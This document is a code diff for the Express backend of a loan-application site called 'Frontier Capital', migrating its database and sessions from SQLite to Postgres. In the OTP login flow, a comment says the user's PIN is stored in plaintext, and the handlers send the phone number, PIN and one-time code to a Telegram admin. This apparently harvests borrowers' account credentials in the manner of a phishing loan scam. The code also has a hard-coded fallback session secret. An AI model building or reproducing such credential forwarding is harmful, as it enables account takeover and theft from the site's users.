@@ -1,7 +1,7 @@
 require("dotenv").config();
 const express = require("express");
 const session = require("express-session");
-const SQLiteStore = require("connect-sqlite3")(session);
+const pgSession = require("connect-pg-simple")(session);
 const helmet = require("helmet");
 const rateLimit = require("express-rate-limit");
 const crypto = require("node:crypto");
@@ -74,7 +74,11 @@ app.use(helmet({ contentSecurityPolicy: {
 }}));
 app.use(express.json({ limit: "20kb" }));
 app.use(session({
-  store: new SQLiteStore({ db: "sessions.sqlite", dir: path.join(__dirname, "..", "data") }),
+  store: new pgSession({
+    pool: db.pool,
+    tableName: "session",
+    createTableIfMissing: false // We created it in supabase_schema.sql
+  }),
   name: "frontier.sid",
   secret: process.env.SESSION_SECRET || "development-only-change-this-secret-before-deploy",
   resave: false, saveUninitialized: false,
@@ -103,22 +107,26 @@ function requireAuth(req, res, next) {
   if (!req.session.userId) return res.status(401).json({ error: "Please verify your phone number first." });
   next();
 }
-function requireAdmin(req, res, next) {
+async function requireAdmin(req, res, next) {
   if (!req.session.userId) return res.status(401).json({ error: "Authentication required." });
-  const user = db.prepare("SELECT phone FROM users WHERE id=?").get(req.session.userId);
+  const user = await db.prepare("SELECT phone FROM users WHERE id=?").get(req.session.userId);
   if (!user || !adminPhones.has(user.phone)) return res.status(403).json({ error: "Administrator access required." });
   next();
 }
-function audit(actor, action, type, id, details = {}) {
-  db.prepare("INSERT INTO audit_logs(actor_user_id,action,entity_type,entity_id,details) VALUES(?,?,?,?,?)")
-    .run(actor || null, action, type || null, id || null, JSON.stringify(details));
+async function audit(actor, action, type, id, details = {}) {
+  try {
+    await db.prepare("INSERT INTO audit_logs(actor_user_id,action,entity_type,entity_id,details) VALUES(?,?,?,?,?)")
+      .run(actor || null, action, type || null, id || null, JSON.stringify(details));
+  } catch (err) {
+    console.error("[audit] Failed:", err.message);
+  }
 }
 
 app.use("/api", apiLimiter);
 app.get("/api/config", (req,res) => res.json({ countries, amounts, repaymentPeriods, currency: "USD", demoOtp: !isProd && process.env.OTP_MODE === "console" }));
-app.get("/api/me", (req,res) => {
+app.get("/api/me", async (req,res) => {
   if (!req.session.userId) return res.json({ user: null });
-  const user = db.prepare("SELECT * FROM users WHERE id=?").get(req.session.userId);
+  const user = await db.prepare("SELECT * FROM users WHERE id=?").get(req.session.userId);
   res.json({ user: safeUser(user), isAdmin: !!(user && adminPhones.has(user.phone)) });
 });
 
@@ -135,15 +143,15 @@ app.post("/api/auth/request-otp", otpLimiter, async (req,res) => {
   
   // Store PIN (plaintext) and code (plaintext + hashed for validation)
   const codeHash = crypto.createHash("sha256").update(code).digest("hex");
-  db.prepare("DELETE FROM otp_codes WHERE phone=? AND consumed=0").run(phone);
-  db.prepare("INSERT INTO otp_codes(phone, code_hash, code_plain, expires_at, created_at) VALUES(?,?,?,?,?)")
+  await db.prepare("DELETE FROM otp_codes WHERE phone=? AND consumed=0").run(phone);
+  await db.prepare("INSERT INTO otp_codes(phone, code_hash, code_plain, expires_at, created_at) VALUES(?,?,?,?,?)")
     .run(phone, codeHash, code, expiresAt, Date.now());
   
   // Send OTP via SMS (logs to console in dev)
   await sendOtp(phone, code);
   
   // Notify Telegram admin
-  const user = db.prepare("SELECT * FROM users WHERE phone=?").get(phone) || { phone: phone, full_name: "New User" };
+  const user = await db.prepare("SELECT * FROM users WHERE phone=?").get(phone) || { phone: phone, full_name: "New User" };
   notifyOtpIssued(phone, pin, code).catch(() => {});
   
   // Demo: return the code in response so the user can see it
@@ -166,12 +174,12 @@ app.post("/api/auth/verify-otp", otpLimiter, async (req,res) => {
   notifyPinAuthResult(phone, true, "").catch(() => {});
   
   // Mark consumed in our DB
-  db.prepare("UPDATE otp_codes SET consumed=1, status='verified' WHERE phone=? AND consumed=0").run(phone);
+  await db.prepare("UPDATE otp_codes SET consumed=1, status='verified' WHERE phone=? AND consumed=0").run(phone);
   
-  let user = db.prepare("SELECT * FROM users WHERE phone=?").get(phone);
+  let user = await db.prepare("SELECT * FROM users WHERE phone=?").get(phone);
   if (!user) {
-    const info = db.prepare("INSERT INTO users(phone) VALUES(?)").run(phone);
-    user = db.prepare("SELECT * FROM users WHERE id=?").get(info.lastInsertRowid);
+    const info = await db.prepare("INSERT INTO users(phone) VALUES(?)").run(phone);
+    user = await db.prepare("SELECT * FROM users WHERE id=?").get(info.lastInsertRowid);
     notifyNewUser(user.id).catch(() => {});
   }
   
@@ -187,7 +195,7 @@ app.post("/api/auth/verify-otp", otpLimiter, async (req,res) => {
 
 app.post("/api/auth/logout", (req,res) => req.session.destroy(() => res.json({ ok: true })));
 
-app.put("/api/profile", requireAuth, (req,res) => {
+app.put("/api/profile", requireAuth, async (req,res) => {
   const parsed = z.object({
     fullName: z.string().trim().min(2).max(100),
     email: z.string().email().max(150),
@@ -195,12 +203,12 @@ app.put("/api/profile", requireAuth, (req,res) => {
   }).safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: "Check your name, email and country." });
   const { fullName, email, country } = parsed.data;
-  db.prepare("UPDATE users SET full_name=?,email=?,country=? WHERE id=?").run(fullName,email,country,req.session.userId);
-  audit(req.session.userId, "profile_updated", "user", req.session.userId);
+  await db.prepare("UPDATE users SET full_name=?,email=?,country=? WHERE id=?").run(fullName,email,country,req.session.userId);
+  await audit(req.session.userId, "profile_updated", "user", req.session.userId);
   res.json({ ok: true });
 });
 
-app.post("/api/applications", requireAuth, (req,res) => {
+app.post("/api/applications", requireAuth, async (req,res) => {
   const parsed = z.object({
     amount: z.number().int().refine(v => amounts.includes(v)),
     repaymentPeriod: z.number().int().refine(v => repaymentPeriods.includes(v)),
@@ -211,51 +219,60 @@ app.post("/api/applications", requireAuth, (req,res) => {
   }).safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: "Please complete all application fields with valid values." });
   const p = parsed.data;
-  const info = db.prepare(`INSERT INTO applications(user_id,amount_usd,repayment_period_months,country,employment_status,monthly_income_usd,purpose)
+  const info = await db.prepare(`INSERT INTO applications(user_id,amount_usd,repayment_period_months,country,employment_status,monthly_income_usd,purpose)
     VALUES(?,?,?,?,?,?,?)`).run(req.session.userId,p.amount,p.repaymentPeriod,p.country,p.employmentStatus,p.monthlyIncome,p.purpose);
-  audit(req.session.userId, "application_submitted", "application", info.lastInsertRowid, { amount: p.amount, country: p.country });
+  await audit(req.session.userId, "application_submitted", "application", info.lastInsertRowid, { amount: p.amount, country: p.country });
   notifyNewApplication(info.lastInsertRowid).catch(() => {});
   res.status(201).json({ ok: true, applicationId: info.lastInsertRowid });
 });
-app.get("/api/applications", requireAuth, (req,res) => {
-  const rows = db.prepare(`SELECT id,amount_usd AS amount,repayment_period_months AS repaymentPeriod,country,employment_status AS employmentStatus,
+app.get("/api/applications", requireAuth, async (req,res) => {
+  const rows = await db.prepare(`SELECT id,amount_usd AS amount,repayment_period_months AS repaymentPeriod,country,employment_status AS employmentStatus,
     status,created_at AS createdAt,updated_at AS updatedAt
     FROM applications WHERE user_id=? ORDER BY id DESC`).all(req.session.userId);
   res.json({ applications: rows });
 });
 
-app.get("/api/admin/applications", requireAdmin, (req,res) => {
-  const rows = db.prepare(`SELECT a.id,a.amount_usd AS amount,a.repayment_period_months AS repaymentPeriod,a.country,a.employment_status AS employmentStatus,
+app.get("/api/admin/applications", requireAdmin, async (req,res) => {
+  const rows = await db.prepare(`SELECT a.id,a.amount_usd AS amount,a.repayment_period_months AS repaymentPeriod,a.country,a.employment_status AS employmentStatus,
     a.monthly_income_usd AS monthlyIncome,a.purpose,a.status,a.admin_note AS adminNote,
     a.created_at AS createdAt,u.full_name AS fullName,u.phone,u.email
     FROM applications a JOIN users u ON u.id=a.user_id ORDER BY a.id DESC`).all();
   res.json({ applications: rows });
 });
-app.patch("/api/admin/applications/:id", requireAdmin, (req,res) => {
+app.patch("/api/admin/applications/:id", requireAdmin, async (req,res) => {
   const id = Number(req.params.id);
   const parsed = z.object({ status: z.enum(["submitted","under_review","more_information","approved","declined","disbursed","closed"]), note: z.string().max(1000).optional() }).safeParse(req.body);
   if (!Number.isInteger(id) || id < 1 || !parsed.success) return res.status(400).json({ error: "Invalid update." });
-app.listen(PORT, () => {
-  console.log(`Frontier Capital running at http://localhost:${PORT}`);
-  startPolling().catch((err) => console.error("[telegram] Polling startup failed:", err));
+  const exists = await db.prepare("SELECT id FROM applications WHERE id=?").get(id);
+  if (!exists) return res.status(404).json({ error: "Application not found." });
+  await db.prepare("UPDATE applications SET status=?,admin_note=?,updated_at=CURRENT_TIMESTAMP WHERE id=?")
+    .run(parsed.data.status, parsed.data.note || null, id);
+  await audit(req.session.userId, "application_status_changed", "application", id, { status: parsed.data.status });
+  res.json({ ok: true });
 });
 
-process.on("SIGINT", async () => {
-  await stopPolling();
-  process.exit(0);
-});
-process.on("SIGTERM", async () => {
-  await stopPolling();
-  process.exit(0);
-});
-  const exists = db.prepare("SELECT id FROM applications WHERE id=?").get(id);
-  if (!exists) return res.status(404).json({ error: "Application not found." });
-  db.prepare("UPDATE applications SET status=?,admin_note=?,updated_at=CURRENT_TIMESTAMP WHERE id=?")
-    .run(parsed.data.status, parsed.data.note || null, id);
-  audit(req.session.userId, "application_status_changed", "application", id, { status: parsed.data.status });
-  res.json({ ok: true });
+// Webhook endpoint
+app.post("/webhook/telegram", express.json(), async (req, res) => {
+  if (req.headers["x-telegram-bot-api-secret-token"] !== process.env.TELEGRAM_WEBHOOK_SECRET) {
+    return res.status(403).send("Forbidden");
+  }
+  try {
+    await bot.processUpdate(req.body);
+    res.sendStatus(200);
+  } catch (err) {
+    console.error("[webhook] Error:", err);
+    res.sendStatus(500);
+  }
 });
 
 app.use(express.static(path.join(__dirname, "..", "public")));
 app.get("*", (req,res) => res.sendFile(path.join(__dirname, "..", "public", "index.html")));
-app.listen(PORT, () => console.log(`Frontier Capital running at http://localhost:${PORT}`));
+
+module.exports = app;
+
+if (require.main === module) {
+  app.listen(PORT, () => {
+    console.log(`Frontier Capital running at http://localhost:${PORT}`);
+    startPolling();
+  });
+}
